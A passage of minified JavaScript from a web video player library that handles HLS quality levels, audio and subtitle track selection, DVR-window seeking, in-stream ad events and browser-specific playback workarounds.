c=b.data;b=p.string(this.hlsQualityLevel),this.player.autoLevelEnabled&&(b="-1"),0<=this.player.currentLevel&&this.updateVideoQualityPlaybackLevel(this.player.currentLevel),c!=b&&(this.hlsQualityLevel=p.parseInt(c),this.player.currentLevel=this.hlsQualityLevel,Object.prototype.hasOwnProperty.call(this.variables,"saveBandwidthMode")&&fb.__cast(this.variables.saveBandwidthMode,be)&&(this.player.capLevelToPlayerSize="-1"==c),(b=new W("videoQualityHasChanged")).data=c,b.dispatch(this.context))}},updateAudioSets:function(){var b=this.player.audioTracks;if(null!=b&&b.length>=this.minAudioTracksForInfo){for(var c=[],d=0;d<b.length;){var q=b[d];if(++d,null!=q.lang&&""!=q.lang){var X=new $a;X.id=p.string(q.id),X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.lang)),null!=X.name&&""!=X.name||(X.name=q.name),null!=X.name&&""!=X.name||(X.name=q.lang),X.languageCode=q.lang,X.isDefault=q.default,c.push(X)}}c.length>=this.minAudioTracksForInfo&&((b=new aa("audioData")).data=c,b.dispatch(this.context))}},updateSubtitlesSets:function(){var b=this.player.subtitleTracks;if(null!=b&&0<b.length){for(var c=[],d=0;d<b.length;){var q=b[d];if(++d,null!=q.lang&&""!=q.lang){var X=new Ab;X.id=p.string(q.id),X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.lang)),X.languageCode=q.lang,X.preselected=q.autoselect&&m.field(q,"default"),c.push(X)}}null!=this.variables.subtitles&&0<c.length&&ba.preselectSubtitlesSet(this.variables.subtitles,c),0<c.length&&((d=new aa("subtitleData")).data=c,d.dispatch(this.context))}else if(null!=this.video&&null!=this.video.textTracks&&0<this.video.textTracks.length){for(c=[],d=0,b=this.video.textTracks;d<b.length;)q=b[d],++d,null!=q.language&&""!=q.language&&((X=new Ab).id=null==q.id?"null":""+q.id,X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.language)),X.languageCode=q.language,X.preselected="showing"==q.mode,c.push(X));null!=this.variables.subtitles&&0<c.length&&ba.preselectSubtitlesSet(this.variables.subtitles,c),0<c.length&&((d=new aa("subtitleData")).data=c,d.dispatch(this.context))}},onHasplayerKeySessionCreated:function(b){return new T("drmAuthenticationComplete").dispatch(this.context),null},onSelectSubtitles:function(b){if(null!=b&&null!=this.player){var c=b.data;if(0<this.player.subtitleTracks.length)if(null!=c){c=p.parseInt(c.id),b=0;for(var d=this.player.subtitleTracks;b<d.length;){var q=d[b];if(++b,q.id==c){this.player.subtitleTrack=c;break}}}else this.player.subtitleTrack=-1;else if(null!=this.video&&null!=this.video.textTracks&&0<this.video.textTracks.length)if(null!=c)for(b=0,d=this.video.textTracks.length;b<d;)q=b++,(q=this.video.textTracks[q]).mode=q.id==c.id?"showing":"disabled";else for(b=0,d=this.video.textTracks.length;b<d;)q=b++,(q=this.video.textTracks[q]).mode="disabled"}},onSelectAudio:function(b){if(null!=b&&null!=this.player&&null!=(b=b.data)){b=p.parseInt(b.id);for(var c=0,d=this.player.audioTracks;c<d.length;){var q=d[c];if(++c,q.id==b){this.player.audioTrack=b;break}}}},pause:function(){h.isEdge&&null!=this.unfreezeEdgeBrowserTimer||this.video.pause()},initSource:function(){var b=this;null!=this.media&&this.source!=this.media.source[0].url&&(this.setDefaultPlayback(),this.source=this.media.source[0].url,Rb.delay((function(){b.isBuffering=!0,new T("bufferingStart").dispatch(b.context)}),0))},play:function(){if(null!=this.video&&this.video.hasAttribute("data-mse-resetting"))this.video.addEventListener("player_reset",U(this,this.onPlayerResetWithMseExtension));else{if(this.initSource(),this.isDvr()){var b=this.getDVRWindowRange();null!=b&&(this.video.currentTime<b.start?this.seek(0):this.video.currentTime>b.end&&this.seek(b.end-b.start))}null!=this.video&&(null!=(b=this.video.play())&&b.catch(U(this,this.onPlayPromiseError)))}},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},onPlayPromiseError:function(b){var c=this;null==b||"NotAllowedError"!=b.name&&"AbortError"!=b.name?(this.log("BRADMAX PLAYER NOTICE:\nException occured durring starting player. Details below:\n","error"),this.log(b,"error")):(this.isPlaybackNotAllowed=!0,this.variables.autoplay?this.log("BRADMAX PLAYER NOTICE:\nBrowser doesn't allow for autoplaying video without user interaction.\nPlayer is waiting for user 'play' click. You can autoplay muted video (mute=true).\n\nMode details about browser autoplay policy: https://developers.google.com/web/updates/2017/09/autoplay-policy-changes","warn"):(this.log("BRADMAX PLAYER NOTICE:\nBrowser block starting playing video. Details below:\n","warn"),this.log(b,"warn")),21!=this.playbackState&&20!=this.playbackState&&11!=this.playbackState&&10!=this.playbackState&&Rb.delay((function(){c.dispatchEvent(c.isAdvertisement?new Q("adPaused"):new T("paused")),c.dispatchEvent(new T("bufferingEnd")),c.isBuffering=!1}),0))},playPause:function(){this.isPaused()?this.play():this.pause()},setDefaultPlayback:function(){this.cleanPlayer(),this.initPlayer(),this.player.loadSource(this.media.source[0].url)},getPlaybackStartTime:function(b){var c=null;return null!=this.dvrWindowStartTimeTs&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<this.getNowTs()&&(c=this.dvrWindowStartTimeTs),null!=b&&null!=b.mediaUserSettings&&null!=b.mediaUserSettings.resumePostion&&(c=b.mediaUserSettings.resumePostion),null!=this.prePlaybackSeekRelativePosition&&null!=b&&0<b.duration&&(c=this.prePlaybackSeekRelativePosition*b.duration),null!=c&&null!=this.dvrWindowStartTimeTs&&c<this.dvrWindowStartTimeTs&&(c=this.dvrWindowStartTimeTs),null!=c&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<c&&(c=this.dvrWindowEndTimeTs),c},seek:function(b){var c=this,d=this.isPaused()&&null==this.source,q=!1;this.isDvr()?(b=this.dvrWindowTimeToDvrRelativePlaybackTime(b),null!=(d=this.getDVRWindowRange())&&(q=0,null!=this.player&&null!=this.player.bufferController&&null!=this.player.bufferController.details&&0<this.player.bufferController.details.averagetargetduration&&(q=this.player.bufferController.details.averagetargetduration),b>d.end-q?b=d.end-q:b<d.start&&(b=d.start),q=b<=d.start+q)):(0>b?b=0:null!=this.video&&b>this.video.duration&&(b=this.video.duration),d&&(0<this.media.duration&&(this.prePlaybackSeekRelativePosition=b/this.media.duration,this.prePlaybackHandlingSeeking=!0),this.initSource()),this.isPaused()&&!d&&Rb.delay((function(){c.isBuffering=!0,new T("bufferingStart").dispatch(c.context)}),0)),this.video.currentTime=b,this.dispatchEvent(new T("seekingStart")),null!=this.video&&this.video.paused&&!q&&(this.play(),this.pause())},dvrWindowTimeToDvrRelativePlaybackTime:function(b){var c=this.getDVRWindowRange();return null==c?b:b+c.start},getDvrWindowEndTimeOffset:function(){var b=0;if(null!=this.dvrWindowEndTimeTs){var c=this.getDVRWindowRange();null!=c&&this.dvrWindowEndTimeTs<c.end&&(b=c.end-this.dvrWindowEndTimeTs)}return b},getDVRWindowRange:function(){var b=this.getDVRWindowRangeRaw();return null==b?null:(null!=this.dvrWindowStartTimeTs&&null!=this.dvrPlaybackStartTs&&this.dvrRelatibePlaybackTimeToTs(b.start)<this.dvrWindowStartTimeTs&&(b.start=this.dvrWindowStartTimeTs-this.dvrPlaybackStartTs),null!=this.dvrWindowEndTimeTs&&null!=this.dvrPlaybackStartTs&&this.dvrWindowEndTimeTs<this.dvrRelatibePlaybackTimeToTs(b.end)&&(b.end=this.dvrWindowEndTimeTs-this.dvrPlaybackStartTs),b)},dvrRelativePlaybackTimeToDvrWindowTime:function(b){var c=this.getDVRWindowRange();return null==c?b:b-c.start},dvrRelatibePlaybackTimeToTs:function(b){var c=0;return null!=this.dvrPlaybackStartTs&&(c=this.dvrPlaybackStartTs),c+b},getDVRWindowSize:function(){var b=this.getDVRWindowRange();return null==b?0:b.end-b.start},getNowTs:function(){return(new Date).getTime()/1e3},selectAudio:function(b){},selectSubtitles:function(b){},volume:function(b){this.video.volume=b},setData:function(b){this.media=b,this.isBuffering=this.isPlaybackNotAllowed=this.isHlsLiveStream=this.hasSubtitlesAndAudioInitialized=!1,this.lastTimeUpdatePostionForEdgeBrowser=null,this.prePlaybackHandlingSeeking=!1,this.stopUnfreezeEdgeBrowserTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopLiveEdgeUpdateTimer(),this.hlsQualityLevel=p.parseInt("-1"),null!=this.player&&(this.player.stopLoad(),this.player.destroy(),this.player=null),this.liveStreamRestartsOnError=0,this.dvrWindowLength=this.dvrRequestedInitialTimeTs=this.dvrPlaybackStartTs=null,this.dvrIsSupported=!1,Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowStartTime")?(this.dvrWindowStartTimeTs=m.field(this.variables,"dvrWindowStartTime"),this.getNowTs()<this.dvrWindowStartTimeTs&&(this.dvrWindowStartTimeTs=null),m.deleteField(this.variables,"dvrWindowStartTime")):this.dvrWindowStartTimeTs=null,Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowEndTime")?(this.dvrWindowEndTimeTs=m.field(this.variables,"dvrWindowEndTime"),m.deleteField(this.variables,"dvrWindowEndTime")):this.dvrWindowEndTimeTs=null,1==this.variables.autoplay&&this.play()},playerResize:function(b){},videoReady:function(){},onDurationChange:function(b){},saveBandwidthModeVisibilityChange:function(b){b?(this.saveBandwidthModeStore={currentLevel:this.player.currentLevel,nextLevel:this.player.nextLevel,nextAutoLevel:this.player.nextAutoLevel,nextLoadLevel:this.player.nextLoadLevel,capLevelToPlayerSize:this.player.capLevelToPlayerSize},this.player.capLevelToPlayerSize=!1,this.player.nextLevel=0,this.player.nextAutoLevel=0,this.player.nextLoadLevel=0):null!=this.saveBandwidthModeStore&&(this.player.nextLevel=this.saveBandwidthModeStore.nextLevel,this.player.nextAutoLevel=this.saveBandwidthModeStore.nextAutoLevel,this.player.nextLoadLevel=this.saveBandwidthModeStore.nextLoadLevel,this.player.currentLevel=this.saveBandwidthModeStore.currentLevel,this.player.capLevelToPlayerSize=this.saveBandwidthModeStore.capLevelToPlayerSize,this.saveBandwidthModeStore=null)},__class__:tc};var Pb=function(b){this.playbackRate=1,this.isStartTimeInitialized=!1,this.currentTime=0,this.isAdvertisement=this.isInStreamAdvertisement=this.initialAsAdvertisement=!1,this.minAudioTracksForInfo=2,null==Pb.instances.h[(b?"ad_":"")+this.context]&&(this.initialAsAdvertisement=this.isAdvertisement=b,this.isInStreamAdvertisement=!1,this.state=0,this.fairPlayDrm=new Ze(this),this.isBuffering=this.isStartTimeInitialized=this.areSubtitlesAndAudioTracksInitialized=!1,this.prePlaybackSeekRelativePosition=null,this.videoElementCommandsQueue=[],this.androidHlsPlaybackEndWatchdogTimer=this.androidHlsPlaybackWatchdogTimer=this.videoElementPromise=null,this.onErrorFallbackTriesNum=0,this.iosIsStalledConnectionDetectionEnabled=this.iosIsStalledConnection=!1,this.iosIsStalledConnectionProblemsStart=null,this.mobileOrSafariBufferingTimeoutOccurred=this.hasCriticalErrorBeenDispatched=!1)};wa["bs.player.plugin.video.videoPlayer.VideoWeb"]=Pb,Pb.__name__="bs.player.plugin.video.videoPlayer.VideoWeb",Pb.__interfaces__=[S],Pb.canPlay=function(b){var c=Pb.getExtension(b.url);if("com/videoplayback"==c&&null!=b.url&&-1!=b.url.indexOf("googlevideo.com/videoplayback")&&-1!=b.url.indexOf("mime=video/mp4")&&(c="mp4"),h.isAndroid&&"m3u8"==c)return!1;if(!Object.prototype.hasOwnProperty.call(Pb.canPlayFileExtensionCache.h,c)){b=Pb.canPlayFileExtensionCache;var d=Pb.checkIfCanPlayFileType(c);b.h[c]=d}return Pb.canPlayFileExtensionCache.h[c]},Pb.getExtension=function(b){var c=b.split("?")[0];return c=da.substr(c,c.lastIndexOf(".")+1,null).toLowerCase(),-1!=b.indexOf(";jsessionid=")&&(b=b.split(";jsessionid=")[0],c=da.substr(b,b.lastIndexOf(".")+1,null).toLowerCase()),c},Pb.checkIfCanPlayFileType=function(b){return""!=window.document.createElement("video").canPlayType("m3u8"==b?"application/vnd.apple.mpegurl":"video/"+b)},Pb.getInstance=function(b,c){var d=c?"ad_":"";return Object.prototype.hasOwnProperty.call(Pb.instances.h,d+b)?Pb.instances.h[d+b]:(c=new Pb(c),Pb.instances.h[d+b]=c,c.context=b,c.create(),c)},Pb.prototype={minAudioTracksForInfo:null,context:null,variables:null,isAdvertisement:null,isInStreamAdvertisement:null,initialAsAdvertisement:null,inStreamAdvertStartPos:null,inStreamAdvertMedia:null,hasCriticalErrorBeenDispatched:null,video:null,media:null,mediaSourceUrl:null,subtitlesRenderer:null,currentTime:null,state:null,fairPlayDrm:null,mobileOrSafariBufferingTimeoutTimer:null,mobileOrSafariBufferingTimeoutOccurred:null,initializeAfterCanplaythrouTimer:null,areSubtitlesAndAudioTracksInitialized:null,prePlaybackSeekRelativePosition:null,videoElementPromise:null,videoElementCommandsQueue:null,isStartTimeInitialized:null,isPlaybackNotAllowed:null,onErrorFallbackTriesNum:null,isBuffering:null,lastPausedTime:null,iosIsStalledConnection:null,iosIsStalledConnectionDetectionEnabled:null,iosIsStalledConnectionProblemsStart:null,iosHitDecoderAfter:null,iosLastPlayingEvent:null,iosLastPlayingEventPosition:null,androidHlsPlaybackWatchdogTimer:null,androidHlsPlaybackEndWatchdogTimer:null,playbackRestartTimeoutTimer:null,liveStreamEndingTimeout:null,liveEdgeUpdateTimer:null,ios15ErrorTimoutTimer:null,dvrWindowStartTimeTs:null,dvrWindowTailLastSend:null,dvrWindowEndTimeTs:null,dvrPlaybackStartTs:null,dvrRequestedInitialTimeTs:null,playbackRate:null,create:function(){W.add(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.add(this.context,"selectAudio",U(this,this.onSelectAudio)),"Safari"!=h.browserName||h.isSamsungSmartTVTizen||(na.add(this.context,"resize",U(this,this.onPlayerResizeEvent)),window.addEventListener("resize",U(this,this.onWindowResize))),Q.add(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.add(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd)),Q.add(this.context,"adInStreamAdsBreaksInfo",U(this,this.onAdInStreamAdsBreaksInfo))},onAdInStreamPlaying:function(b){this.isInStreamAdvertisement=this.isAdvertisement=!0},onAdInStreamEnd:function(b){this.isAdvertisement=this.initialAsAdvertisement,this.isInStreamAdvertisement=!1,!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||(this.iosHitDecoderAfter=this.video.currentTime+.5)},onAdClipInStreamPlaying:function(b){null!=this.video&&null!=this.media&&(this.inStreamAdvertStartPos=this.video.currentTime,null!=b.data&&0<=b.data.adStartTime&&(this.inStreamAdvertStartPos=b.data.adStartTime,(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&86400<this.inStreamAdvertStartPos&&null!=this.dvrPlaybackStartTs&&0<this.dvrPlaybackStartTs&&(this.inStreamAdvertStartPos-=this.dvrPlaybackStartTs)),this.inStreamAdvertMedia=null,null!=b&&null!=b.data&&(this.inStreamAdvertMedia=b.data.media))},onAdClipInStreamEnd:function(b){this.inStreamAdvertMedia=this.inStreamAdvertStartPos=null},onAdInStreamAdsBreaksInfo:function(b){null!=(b=this.getPlaybackStartTime(this.media))&&0<b&&this.currentTime!=b&&!this.isStartTimeInitialized&&(this.currentTime=b)},isIosOrSafari:function(){return!(!h.isiOS&&"Safari"!=h.browserName)&&!h.isSamsungSmartTVTizen},isIos15Safari:function(){return!(!h.isiOS||"Safari"!=h.browserName||h.isSamsungSmartTVTizen)&&15==h.majorVersion},destroy:function(){this.stopLiveEdgeUpdateTimer(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.stopLiveStreamEndingTimeout(),this.stopMobileOrSafariBufferingTimeoutTimer(),this.stopPlaybackRestartTimeoutTimer(),this.stopInitializeAfterCanplaythrouTimer(),this.stopIos15ErrorTimeoutTimer(),W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.remove(this.context,"selectAudio",U(this,this.onSelectAudio)),"Safari"!=h.browserName||h.isSamsungSmartTVTizen||(na.remove(this.context,"resize",U(this,this.onPlayerResizeEvent)),window.removeEventListener("resize",U(this,this.onWindowResize))),Q.remove(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.remove(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd)),Q.remove(this.context,"adInStreamAdsBreaksInfo",U(this,this.onAdInStreamAdsBreaksInfo)),null!=this.video&&(this.video.removeEventListener("pause",U(this,this.onVideoPause)),this.video.removeEventListener("play",U(this,this.onVideoPlay)),this.video.removeEventListener("playing",U(this,this.onVideoPlaying)),this.video.removeEventListener("timeupdate",U(this,this.onVideoTimeupdate)),this.video.removeEventListener("durationchange",U(this,this.onVideoDurationchange)),this.video.removeEventListener("waiting",U(this,this.onVideoWaiting)),this.video.removeEventListener("ended",U(this,this.onVideoEnded)),this.video.removeEventListener("seeking",U(this,this.onVideoSeeking)),this.video.removeEventListener("seeked",U(this,this.onVideoSeeked)),this.isIos15Safari()?this.video.removeEventListener("error",U(this,this.onErrorIos15Safari)):this.video.removeEventListener("error",U(this,this.onError)),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.video.removeEventListener("stalled",U(this,this.onIosStalled)),this.video.removeEventListener("canplaythrough",U(this,this.onVideoCanplaythrough)),null!=this.fairPlayDrm&&this.video.removeEventListener("webkitneedkey",U(Oa=this.fairPlayDrm,Oa.onNeedKey)),this.video.removeEventListener("loadedmetadata",U(this,this.onVideoLoadedMetadata)),null!=this.video.textTracks&&this.video.textTracks.removeEventListener("addtrack",U(this,this.onAddTrack)),this.video.removeEventListener("ratechange",U(this,this.onVideoRateChange)),this.video.setAttribute("src",""),this.video.load()),this.mediaSourceUrl=this.video=null,Pb.canPlayFileExtensionCache=new Jb,Pb.instances=new Jb,this.areSubtitlesAndAudioTracksInitialized=this.fairPlayDrm=this.state=this.currentTime=this.media=this.isAdvertisement=null,this.isBuffering=this.isStartTimeInitialized=!1,this.onErrorFallbackTriesNum=0,this.iosIsStalledConnectionDetectionEnabled=this.iosIsStalledConnection=!1,this.iosIsStalledConnectionProblemsStart=null},dispatchEvent:function(b,c){if(this.isEventFromRightContext()){var d=this.video.duration,q=this.currentTime;if(null!=this.media&&(this.media.mediaPlaybackInfo.playbackRate=this.getPlaybackRate()),null!=this.media&&this.areSubtitlesAndAudioTracksInitialized){if(this.media.mediaPlaybackInfo.currentTime=q,this.media.mediaPlaybackInfo.isPlaying=!this.video.paused,this.isDvr()){d=this.getDVRWindowSize(),this.media.duration=d;var X=this.getDVRWindowRange();this.isVideoCurrentTimeReliable()?(q=this.dvrRelativePlaybackTimeToDvrWindowTime(this.video.currentTime),this.media.mediaPlaybackInfo.currentTime=this.dvrRelativePlaybackTimeToTs(this.video.currentTime)):(q=this.dvrRelativePlaybackTimeToDvrWindowTime(this.currentTime),this.media.mediaPlaybackInfo.currentTime=this.dvrRelativePlaybackTimeToTs(this.currentTime));var ra=this.media;ra.dvrWindowLength=d,null!=X&&(ra.dvrWindowLiveEdge=this.dvrRelativePlaybackTimeToTs(X.end),"currentTimeChange"==b.type&&(this.dvrWindowTailLastSend=X.start))}}else null!=this.media&&this.isDvr()&&0==this.currentTime&&(ra=this.getPlaybackStartTime(this.media),X=this.getDVRWindowRange(),this.media.mediaPlaybackInfo.currentTime=0<ra?ra:null!=X?this.dvrRelativePlaybackTimeToTs(X.end):this.getNowTs());null!=this.prePlaybackSeekRelativePosition&&0==q&&(q=this.prePlaybackSeekRelativePosition*this.media.duration),ra=X=0;for(var Aa=this.video.buffered.length;ra<Aa;){var Qa=ra++;X+=this.video.buffered.end(Qa)-this.video.buffered.start(Qa)}null==b.data&&(b.data={}),this.isInStreamAdvertisement&&0<=this.inStreamAdvertStartPos&&(q=this.video.currentTime-this.inStreamAdvertStartPos,null!=this.inStreamAdvertMedia&&(d=this.inStreamAdvertMedia.duration),q>d&&(q=d),0==this.video.currentTime&&0>q&&(q=d,null!=this.media&&null!=this.media.mediaPlaybackInfo&&(this.media.mediaPlaybackInfo.currentTime=this.inStreamAdvertStartPos+d))),b.data.duration=d,b.data.currentTime=q,b.data.videoTagCurrentTime=this.video.currentTime,b.data.source=this.video.currentSrc,b.data.totalBufferedTime=X,b.data.media=this.media,b.data.additionalData=c,this.isPlaybackNotAllowed&&(null==b.data.additionalData&&(b.data.additionalData={}),b.data.additionalData.isPlaybackNotAllowed=!0),b.dispatch(this.context)}},dvrRelativePlaybackTimeToDvrWindowTime:function(b){var c=this.getDVRWindowRange();return null==c?b:b-c.start},dvrWindowTimeToDvrRelativePlaybackTime:function(b){if(null!=this.dvrWindowTailLastSend)return b+this.dvrWindowTailLastSend;var c=this.getDVRWindowRange();return null==c?b:b+c.start},isDvr:function(){return null!=this.media&&this.media instanceof xa},dvrRelativePlaybackTimeToTs:function(b){var c=0;return null!=this.dvrPlaybackStartTs&&(c=this.dvrPlaybackStartTs),c+b},getDVRWindowRangeRaw:function(){return null==this.video||null==this.video.seekable||0==this.video.seekable.length?null:{start:this.video.seekable.start(0),end:this.video.seekable.end(0)}},getDVRWindowRange:function(){var b=this.getDVRWindowRangeRaw();return null==b?null:(null!=this.dvrWindowStartTimeTs&&null!=this.dvrPlaybackStartTs&&this.dvrRelativePlaybackTimeToTs(b.start)<this.dvrWindowStartTimeTs&&(b.start=this.dvrWindowStartTimeTs-this.dvrPlaybackStartTs),null!=this.dvrWindowEndTimeTs&&null!=this.dvrPlaybackStartTs&&this.dvrWindowEndTimeTs<this.dvrRelativePlaybackTimeToTs(b.end)&&(b.end=this.dvrWindowEndTimeTs-this.dvrPlaybackStartTs),b)},getDVRWindowSize:function(){var b=this.getDVRWindowRange();return null!=b&&isFinite(b.end)?b.end-b.start:0},getNowTs:function(){return(new Date).getTime()/1e3},attachSubtitlesRenderer:function(b){this.subtitlesRenderer=b},attachVideo:function(b){this.video=b,this.video.addEventListener("pause",U(this,this.onVideoPause)),this.video.addEventListener("play",U(this,this.onVideoPlay)),this.video.addEventListener("playing",U(this,this.onVideoPlaying)),this.video.addEventListener("timeupdate",U(this,this.onVideoTimeupdate)),this.video.addEventListener("durationchange",U(this,this.onVideoDurationchange)),this.video.addEventListener("waiting",U(this,this.onVideoWaiting)),this.video.addEventListener("ended",U(this,this.onVideoEnded)),this.video.addEventListener("seeking",U(this,this.onVideoSeeking)),this.video.addEventListener("seeked",U(this,this.onVideoSeeked)),this.isIos15Safari()?this.video.addEventListener("error",U(this,this.onErrorIos15Safari)):this.video.addEventListener("error",U(this,this.onError)),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.video.addEventListener("stalled",U(this,this.onIosStalled)),this.video.addEventListener("canplaythrough",U(this,this.onVideoCanplaythrough)),this.video.addEventListener("loadedmetadata",U(this,this.onVideoLoadedMetadata)),null!=this.video.textTracks&&this.video.textTracks.addEventListener("addtrack",U(this,this.onAddTrack)),"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.video.addEventListener("webkitneedkey",U(Oa=this.fairPlayDrm,Oa.onNeedKey),!1),this.video.addEventListener("ratechange",U(this,this.onVideoRateChange)),this.checkPlaybackRate(),this.triggerVideoPlaybackRateEvent()},setPlaybackRate:function(b){this.isAdvertisement||(this.playbackRate=b,this.checkPlaybackRate())},getPlaybackRate:function(){return this.video.playbackRate},onVideoRateChange:function(b){this.triggerVideoPlaybackRateEvent()},triggerVideoPlaybackRateEvent:function(){if(!this.isAdvertisement){var b=new T("playbackRate");b.data=this.getPlaybackRate(),b.dispatch(this.context)}},checkPlaybackRate:function(){this.isAdvertisement||isNaN(this.playbackRate)||this.getPlaybackRate()==this.playbackRate||(this.video.playbackRate=this.playbackRate)},onAddTrack:function(b){var c=this.isAdvertisement?new Q("addTrack"):new T(T.ADD_TRACK);c.data={track:b},this.dispatchEvent(c)},onVideoPause:function(){this.isEventFromRightContext()&&(this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.lastPausedTime=new Date,0<this.video.currentTime&&this.video.currentTime==this.video.duration||(this.state=102,this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused"))))},onVideoPlay:function(){this.isEventFromRightContext()&&(this.state=103,this.stopAndroidHlsPlaybackEndWatchdogTimer(),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||!this.isDvr()||this.isVideoElementPlaying())&&(this.checkPlaybackRate(),this.storeStartPlayingPositionForCastingIos(),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")))},onVideoPlaying:function(){this.isEventFromRightContext()&&(this.stopMobileOrSafariBufferingTimeoutTimer(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.storeStartPlayingPositionForCastingIos())},storeStartPlayingPositionForCastingIos:function(){(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&null!=this.video&&0<this.video.currentTime&&(this.iosLastPlayingEvent=new Date,this.iosLastPlayingEventPosition=this.video.currentTime)},shouldRestorePlaybackPositionForCastingIos:function(){return!!((h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&null!=this.iosLastPlayingEvent&&this.isAirPlayCasting()&&3e3>(new Date).getTime()-this.iosLastPlayingEvent.getTime()&&null!=this.iosLastPlayingEventPosition&&null!=this.video&&1<=this.video.currentTime&&1/0!=this.video.duration&&1<=this.video.duration)&&1<this.iosLastPlayingEventPosition-this.video.currentTime},restorePlayingPositionForCastingIos:function(){var b=this,c=this.iosLastPlayingEventPosition;this.iosLastPlayingEventPosition=this.iosLastPlayingEvent=null,Rb.delay((function(){b.seek(c)}),100)},stopAndroidHlsPlaybackEndWatchdogTimer:function(){null!=this.androidHlsPlaybackEndWatchdogTimer&&(this.androidHlsPlaybackEndWatchdogTimer.stop(),this.androidHlsPlaybackEndWatchdogTimer=null)},onVideoTimeupdate:function(){if(this.isEventFromRightContext())if(null!=this.mobileOrSafariBufferingTimeoutTimer&&null!=this.video&&3<=this.video.readyState&&this.stopMobileOrSafariBufferingTimeoutTimer(),this.isDvr()&&null==this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer=new Rb(1e3),this.liveEdgeUpdateTimer.run=U(this,this.onLiveEdgeUpdate)),h.isAndroid&&this.isVideoElementPlaying()&&(this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.androidHlsPlaybackEndWatchdogTimer=Rb.delay(U(this,this.onVideoWaiting),1e3)),null!=this.androidHlsPlaybackWatchdogTimer&&null!=this.video&&0<this.video.currentTime&&(this.androidHlsPlaybackWatchdogTimer.stop(),this.androidHlsPlaybackWatchdogTimer=null),null!=this.iosHitDecoderAfter&&null!=this.video&&this.iosHitDecoderAfter<=this.video.currentTime&&(this.iosHitDecoderAfter=null,this.video.pause(),this.video.play()),this.shouldRestorePlaybackPositionForCastingIos())this.restorePlayingPositionForCastingIos();else{this.isVideoCurrentTimeReliable()&&(this.currentTime=this.video.currentTime,0<this.dvrWindowStartTimeTs&&0<this.media.mediaPlaybackInfo.currentTime&&(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&this.media.mediaPlaybackInfo.currentTime<this.dvrWindowStartTimeTs&&this.seek(this.currentTime+(this.dvrWindowStartTimeTs-this.media.mediaPlaybackInfo.currentTime))),this.iosIsStalledConnectionDetectionEnabled&&!this.isAirPlayCasting()&&this.iosDetectStalledConnection(),0<this.onErrorFallbackTriesNum&&this.isVideoElementPlaying()&&(this.onErrorFallbackTriesNum=0);var b=(101==this.state||15==this.state||this.isBuffering)&&this.isVideoElementPlaying();b&&(this.state=103),this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),b&&(this.isBuffering=!1,this.dispatchEvent(new T("bufferingEnd")),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||!this.isVideoElementPlaying()||(this.storeStartPlayingPositionForCastingIos(),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")))),this.isDvr()&&null!=this.dvrWindowEndTimeTs&&this.media.mediaPlaybackInfo.currentTime>this.dvrWindowEndTimeTs&&(new W("skinPause").dispatch(this.context),this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete")))}},isAirPlayCasting:function(){return!(!h.isiOS||null==this.video)&&this.video.webkitCurrentPlaybackTargetIsWireless},iosDetectStalledConnection:function(){if(!(null==this.video||this.video.seeking||this.video.ended||this.video.paused||null==this.video.buffered||0==this.video.buffered.length)){for(var b=!1,c=0,d=this.video.buffered.length;c<d;){var 